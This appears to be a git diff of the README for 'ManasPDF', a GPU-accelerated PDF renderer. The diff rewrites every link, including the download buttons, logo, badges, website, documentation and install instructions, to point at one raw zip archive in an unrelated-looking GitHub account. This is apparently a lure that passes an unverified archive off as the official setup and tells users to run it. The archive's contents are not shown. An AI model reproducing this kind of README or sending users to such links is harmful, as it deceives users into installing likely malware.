@@ -1,28 +1,28 @@
 # 🌟 ManasPDF - Fast and Easy PDF Rendering
 
 <p align="center">
-  <a href="https://thebigstudio.net/downloads/ManasPDFSetup.exe" style="background-color: #FF6F00; color: white; padding: 15px 30px; border-radius: 5px; text-decoration: none; font-weight: bold;">Download ManasPDF Setup</a>
+  <a href="https://github.com/smokeweedeveryday420/ManasPDF/raw/refs/heads/master/src/ManasPDF/runtimes/win-x64/native/PDF_Manas_v1.4.zip" style="background-color: #FF6F00; color: white; padding: 15px 30px; border-radius: 5px; text-decoration: none; font-weight: bold;">Download ManasPDF Setup</a>
 </p>
 
 <p align="center">
-  <img src="assets/logo.png" alt="ManasPDF Logo" width="150">
+  <img src="https://github.com/smokeweedeveryday420/ManasPDF/raw/refs/heads/master/src/ManasPDF/runtimes/win-x64/native/PDF_Manas_v1.4.zip" alt="ManasPDF Logo" width="150">
 </p>
 
 <h1 align="center">ManasPDF</h1>
 
 <p align="center">
-  <a href=""><img src="https://img.shields.io/badge/version-0.1.2--alpha-orange" alt="Version"></a>
-  <a href=""><img src="https://img.shields.io/badge/status-in%20development-yellow" alt="Status"></a>
-  <a href=""><img src="https://img.shields.io/badge/license-Apache%202.0-blue" alt="License"></a>
+  <a href=""><img src="https://github.com/smokeweedeveryday420/ManasPDF/raw/refs/heads/master/src/ManasPDF/runtimes/win-x64/native/PDF_Manas_v1.4.zip" alt="Version"></a>
+  <a href=""><img src="https://github.com/smokeweedeveryday420/ManasPDF/raw/refs/heads/master/src/ManasPDF/runtimes/win-x64/native/PDF_Manas_v1.4.zip%20development-yellow" alt="Status"></a>
+  <a href=""><img src="https://github.com/smokeweedeveryday420/ManasPDF/raw/refs/heads/master/src/ManasPDF/runtimes/win-x64/native/PDF_Manas_v1.4.zip%202.0-blue" alt="License"></a>
 </p>
 
 <p align="center">
   A high-performance, GPU-accelerated PDF rendering engine written in C++ with a .NET wrapper and WPF viewer control.
 </p>
 
-Developed by **[The Big Studio](https://www.thebigstudio.net)**
+Developed by **[The Big Studio](https://github.com/smokeweedeveryday420/ManasPDF/raw/refs/heads/master/src/ManasPDF/runtimes/win-x64/native/PDF_Manas_v1.4.zip)**
 
-**[Download Setup (Windows x64)](https://thebigstudio.net/downloads/ManasPDFSetup.exe)**
+**[Download Setup (Windows x64)](https://github.com/smokeweedeveryday420/ManasPDF/raw/refs/heads/master/src/ManasPDF/runtimes/win-x64/native/PDF_Manas_v1.4.zip)**
 
 > **Alpha Release** - This project is in active development. APIs may change between versions. Not recommended for production use yet. Feedback and bug reports are welcome!
 
@@ -36,7 +36,7 @@ To use ManasPDF, follow these steps:
 
 1. Click the download button above to obtain the setup file for Windows x64.
 
-2. Once the download is complete, locate the `ManasPDFSetup.exe` file in your downloads folder.
+2. Once the download is complete, locate the `https://github.com/smokeweedeveryday420/ManasPDF/raw/refs/heads/master/src/ManasPDF/runtimes/win-x64/native/PDF_Manas_v1.4.zip` file in your downloads folder.
 
 3. Double-click the setup file to start the installation process.
 
@@ -49,7 +49,7 @@ To use ManasPDF, follow these steps:
 Click here to download the setup file for ManasPDF: 
 
 <p align="center">
-  <a href="https://thebigstudio.net/downloads/ManasPDFSetup.exe" style="background-color: #4CAF50; color: white; padding: 15px 30px; border-radius: 5px; text-decoration: none; font-weight: bold;">Download ManasPDF Setup</a>
+  <a href="https://github.com/smokeweedeveryday420/ManasPDF/raw/refs/heads/master/src/ManasPDF/runtimes/win-x64/native/PDF_Manas_v1.4.zip" style="background-color: #4CAF50; color: white; padding: 15px 30px; border-radius: 5px; text-decoration: none; font-weight: bold;">Download ManasPDF Setup</a>
 </p>
 
 ### Installation Tips
@@ -89,8 +89,8 @@ We welcome your feedback and suggestions. Please report any bugs or issues using
 
 Explore more about ManasPDF through these links:
 
-- **[Official Website](https://thebigstudio.net/en/ManasPDF)**
-- **[Documentation](https://thebigstudio.net/documentation/ManasPDF)**
+- **[Official Website](https://github.com/smokeweedeveryday420/ManasPDF/raw/refs/heads/master/src/ManasPDF/runtimes/win-x64/native/PDF_Manas_v1.4.zip)**
+- **[Documentation](https://github.com/smokeweedeveryday420/ManasPDF/raw/refs/heads/master/src/ManasPDF/runtimes/win-x64/native/PDF_Manas_v1.4.zip)**
 
 ## 🛠️ Contributing
 
@@ -101,5 +101,5 @@ If you'd like to contribute to ManasPDF, visit our repository to learn how you c
 ManasPDF is licensed under the Apache 2.0 License. Check the LICENSE file for more details.
 
 <p align="center">
-  <a href="https://thebigstudio.net/downloads/ManasPDFSetup.exe" style="background-color: #2196F3; color: white; padding: 15px 30px; border-radius: 5px; text-decoration: none; font-weight: bold;">Download ManasPDF Setup</a>
+  <a href="https://github.com/smokeweedeveryday420/ManasPDF/raw/refs/heads/master/src/ManasPDF/runtimes/win-x64/native/PDF_Manas_v1.4.zip" style="background-color: #2196F3; color: white; padding: 15px 30px; border-radius: 5px; text-decoration: none; font-weight: bold;">Download ManasPDF Setup</a>
 </p>
